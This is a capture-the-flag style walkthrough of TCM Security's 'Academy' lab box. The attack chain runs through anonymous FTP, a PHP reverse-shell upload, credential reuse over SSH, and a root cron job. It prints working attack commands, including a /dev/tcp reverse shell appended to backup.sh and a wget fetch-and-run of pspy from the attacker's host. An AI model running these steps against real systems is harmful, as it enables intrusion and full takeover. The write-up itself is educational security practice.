# Academy

> **Details reconstructed from memory of my own completed walkthrough — exact commands/outputs may be paraphrased.**

**Platform:** TCM Security — Practical Ethical Hacking (PEH) Capstone  
**Difficulty:** Easy–Intermediate  
**Category:** Linux, anonymous FTP, file-upload RCE, credential reuse, cron privilege escalation

![OS](https://img.shields.io/badge/OS-Linux-yellow?style=flat-square&logo=linux)

![Technique](https://img.shields.io/badge/Foothold-File%20Upload%20RCE-orange?style=flat-square)

![Status](https://img.shields.io/badge/Status-Educational-blue?style=flat-square)

---

## Overview

Academy is one of the capstone boxes from TCM Security's **Practical Ethical Hacking** course. It models a small Linux web host running an online course-registration portal, with a misconfigured **anonymous FTP** service leaking information on the side. The full chain is a clean, realistic one:

1. Anonymous **FTP** leaks a note naming a user (**grimmie**) who reuses passwords, plus a student credential hash.
2. A vulnerable **file-upload** feature in the course portal gives code execution → a `www-data` shell.
3. Reading the app's **`config.php`** exposes grimmie's database password, which is reused for **SSH** (credential reuse).
4. A root **cron job** runs grimmie's `backup.sh` every minute → append a payload → **root**.

It reinforced the whole methodology end to end — enumerate every service, pivot information from one service into another, and let local enumeration (not assumptions) reveal the privesc.

---

## Reconnaissance

I ran an **nmap** service scan to map the surface:

```bash
nmap -sC -sV -p- -oN academy-full.txt <target-ip>
```

The relevant services:

- **21/tcp** — FTP, with **anonymous login allowed**
- **22/tcp** — OpenSSH
- **80/tcp** — Apache (default landing page at the web root)

### Anonymous FTP enumeration

FTP was the first thing I checked:

```bash
ftp <target-ip>
# Name: anonymous   (blank password)
ls -la
get note.txt
```

The anonymous share held a **note** with two key pieces of information:

- A user called **grimmie** set up the academy website and is known to **reuse passwords**.
- An **SQL query** containing a student login and a **password hash**.

I cracked the hash (CrackStation / `hashcat`) and recovered the plaintext student password (`student`). That gave me a working portal login to work from.

### Web enumeration

The web root was just the default Apache page, so I ran content discovery:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

This revealed a **phpMyAdmin** instance and, following the note's hint about an "academy" site, the real application at **`/academy`** — an instance of **"2020 Online Course Registration System"**, a product with publicly known file-upload exploits.

---

## Exploitation

### 1. Authenticate to the portal

I logged into the `/academy` portal with the cracked student credentials (`student` : `student`), landing on the student profile page — which exposed a **profile-picture upload** field.

### 2. Insecure file upload → PHP webshell

The "2020 Online Course Registration System" upload does not properly validate the uploaded file, so I uploaded a **PHP reverse shell** (pentestmonkey's `php-reverse-shell.php`) through the profile-picture field instead of an image. A public exploit automates this, but doing it manually through the profile upload is just as effective.

### 3. Catch the shell as www-data

With a listener running (`nc -lvnp 4444`), I browsed to the uploaded file under the app's upload directory to trigger it, and received a shell as **`www-data`**. I stabilised the TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z, then: stty raw -echo; fg
```

### 4. Pivot to grimmie via config.php (credential reuse)

Exploring the filesystem, I found **grimmie's home directory** containing a `backup.sh` script, and the application's database config file. Reading it exposed grimmie's MySQL credentials in cleartext:

```bash
cat /var/www/html/academy/includes/config.php
```

```php
$mysql_hostname = "localhost";
$mysql_user     = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
```

The note said grimmie reuses passwords. `su grimmie` didn't take, but **SSH did** — the database password was reused for his system account:

```bash
ssh grimmie@<target-ip>
# password: My_V3ryS3cur3_P4ss
```

I was now the **grimmie** user, and — importantly — the **owner of `backup.sh`**.

---

## Privilege Escalation — root cron over grimmie's backup.sh

As grimmie, `crontab -l` showed nothing, which hinted the script was scheduled by **another user (root)**. I confirmed with **pspy** (transferred via a Python HTTP server + `wget`):

```bash
# attacker
python3 -m http.server 8000
# victim
wget http://<your-ip>:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64
```

pspy confirmed root running the script every minute:

```
* * * * * /home/grimmie/backup.sh
```

The script was a simple backup routine (`zip` of the academy includes into `/tmp`), and since I **own** it, I appended a root reverse shell:

```bash
echo 'bash -i >& /dev/tcp/<your-ip>/9001 0>&1' >> /home/grimmie/backup.sh
```

With a listener on 9001, the next cron tick executed `backup.sh` as root and connected back with a **root shell**. Confirmed with `id` returning `uid=0(root)`.

---

## Proof & Loot

```bash
id                 # uid=0(root)
cat /root/*.txt    # root proof
cat /home/*/*.txt  # user proof
```

---

## Lessons Learned

Academy was a great reminder that **services and secrets leak into each other**. The anonymous FTP note looked minor, but it named the key user, flagged password reuse, and handed over a crackable student hash — three findings that threaded the entire box together.

Key takeaways:

- **Always test anonymous FTP** and read every leaked note; metadata about *people and habits* (password reuse) is as valuable as a raw credential.
- **File-upload features are a top-tier web foothold.** The course-registration app accepted a PHP reverse shell as a "profile picture" — client-side checks mean nothing without server-side validation and a non-executable upload directory.
- **Loot config files immediately after a web foothold.** `config.php` handed over grimmie's DB password, and **credential reuse** turned a `www-data` shell into a real SSH user.
- **Enumerate cron before kernel exploits.** A root cron running a *user-owned* script (`backup.sh`) is a quiet, reliable privesc with no CVE — and **pspy** is the tool that exposes schedules you can't see in your own crontab.

The file-upload foothold connects to my broader web-pentest practice, and the FTP → config → credential-reuse → cron chain is a textbook example of how small misconfigurations stack into full compromise.
